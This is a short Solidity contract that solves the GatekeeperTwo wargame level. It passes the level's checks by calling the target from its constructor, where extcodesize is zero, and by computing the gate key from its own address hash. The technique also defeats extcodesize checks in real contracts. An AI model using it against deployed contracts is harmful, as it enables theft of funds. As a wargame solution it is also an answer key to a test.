pragma solidity ^0.7.3;

import "@openzeppelin/contracts/math/SafeMath.sol";

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttacker {
    using SafeMath for uint256;
    IGatekeeperTwo public challenge;

    constructor(address challengeAddress) {
        challenge = IGatekeeperTwo(challengeAddress);
        // must attack already in constructor because of extcodesize == 0
        // while the contract is being constructed
        uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1);
        challenge.enter(bytes8(gateKey));
    }
}
